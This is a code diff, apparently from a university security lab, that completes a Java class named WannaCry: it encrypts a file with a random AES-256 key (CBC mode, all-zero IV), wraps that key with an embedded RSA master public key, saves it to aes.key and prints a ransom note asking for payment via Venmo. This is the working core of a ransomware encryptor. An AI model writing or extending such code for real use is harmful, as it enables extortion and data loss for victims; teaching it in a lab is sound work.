@@ -6,15 +6,20 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.security.SecureRandom;
+import java.security.KeyFactory;
+import java.security.spec.X509EncodedKeySpec;
 import java.security.KeyStore.SecretKeyEntry;
-import javax.crypto.SecretKey; // I added this for Secret Key? Not sure if that means the above may be the wrong lib.
-import java.security.SecureRandom; // For SecureRandom();
+import java.security.PublicKey;
+import java.util.Base64;
+import javax.crypto.SecretKey; // I added this for Secret Key? Not sure if that means SecretKeyEntry may be the wrong lib.
+import javax.crypto.spec.IvParameterSpec;
+import java.security.SecureRandom;
+import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
 
 public class WannaCry {
     public static void main(String[] args) throws Exception{
-        // Gen 256-bit AES key - Lab2. 
+        // Gen 256-bit AES key - Lab3. 
         KeyGenerator Key_Generator = KeyGenerator.getInstance("AES");
         Key_Generator.init(256, new SecureRandom());
         SecretKey KEY_AES = Key_Generator.generateKey();
@@ -29,9 +34,12 @@ public class WannaCry {
         }
         if (fileBytes == null) return;
 
-        // TODO - Encrypt contents using AES key in CBC mode with PKCS5 padding (IV used is 16 empty bytes)
         byte[] encryptedFileBytes = null;
-
+        // Content's encrypted using AES key, CBC, PKCS5. Lab3.
+        IvParameterSpec Zero_Padding_IV = new IvParameterSpec(new byte[16]);
+        Cipher AES_Cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        AES_Cipher.init(Cipher.ENCRYPT_MODE, KEY_AES, Zero_Padding_IV);
+        encryptedFileBytes=AES_Cipher.doFinal(fileBytes);
 
         try (FileOutputStream fos = new FileOutputStream("test.txt.cry")) {
             if (encryptedFileBytes != null) fos.write(encryptedFileBytes);
@@ -47,24 +55,31 @@ public class WannaCry {
             return;
         }
 
-        // TO DO - Construct Public key  from masterPublicKeyBase64
-     
-        
-
+        //Public key from masterPublicKeyBase64 - Lab1, Lab3.
         String masterPublicKeyBase64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpPqoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXdtcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w16YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1eWi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";
+        Base64.Decoder decoder = Base64.getDecoder(); // From Lab1.
+        byte[] Bytes_Key_Master = decoder.decode(masterPublicKeyBase64);
+        // Wrap in X509EncodedKeySpec
+        X509EncodedKeySpec Spec_Key = new X509EncodedKeySpec(Bytes_Key_Master); // From lab3. 
+        KeyFactory Key_Factory = KeyFactory.getInstance("RSA");
+        PublicKey Key_Master_Public = Key_Factory.generatePublic(Spec_Key);
 
 
-        // TODO - Encrypt AES key bytes with RSA using the master public key
+        // AES key encrypted in bytes with RSA using the public  and master key. Lab3. 
+        Cipher RSA_Cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding"); 
+        RSA_Cipher.init(Cipher.ENCRYPT_MODE, Key_Master_Public);
+        byte[] Aes_Key_Bytes = KEY_AES.getEncoded();
+        byte[] Key_AES_Encrypted = RSA_Cipher.doFinal(Aes_Key_Bytes);
 
-
-        // TODO - Store encrypted AES key bytes in aes.key
-
+        // Write to AES.key the encrypted bytes. Lab1. 
+        try (FileOutputStream fos = new FileOutputStream("aes.key")) {
+            fos.write(Key_AES_Encrypted);
+        }
 
         String ransomMessage = """
-                Dear User! Please note that your files have now been encrypted.
-                To recover your files we ask you to follow the instructions\s
-                in the website below to arrange a small payment:
-                https://www.notascamwepromise.le.ac.uk/wannaCry
+                Dear Victim - Please note that your files have now stolen and encrypted!
+
+                If you want them back, let a girl a know. My venmo is pricessCatBurger28. 
                 """;
         System.out.println(ransomMessage);
         return;
